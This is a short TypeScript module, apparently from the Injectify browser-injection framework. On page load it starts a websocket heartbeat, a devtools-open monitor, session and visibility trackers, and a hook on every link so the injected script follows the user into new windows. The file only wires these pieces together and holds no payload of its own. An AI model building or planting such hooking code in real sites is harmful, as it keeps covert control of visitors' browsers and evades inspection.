import { Injectify } from '../../../definitions/core'
declare const injectify: typeof Injectify

import Heartbeat from '../../lib/Heartbeat'
import WindowInjection from '../WindowInjection'
import SessionInfo from './SessionInfo'
import PageVisibility from './PageVisibility'

export default function AutoRun() {
  const { global } = injectify

  // Websocket heartbeat
  Heartbeat()

  // Devtools open monitor
  injectify.DevtoolsListener()

  // Session info updater
  SessionInfo()

  // Page visibility observer
  PageVisibility()

  // console.log proxy
  // injectify.console(true)

  // Hook all links on the page
  if (!global.windowInjection) new WindowInjection()
}
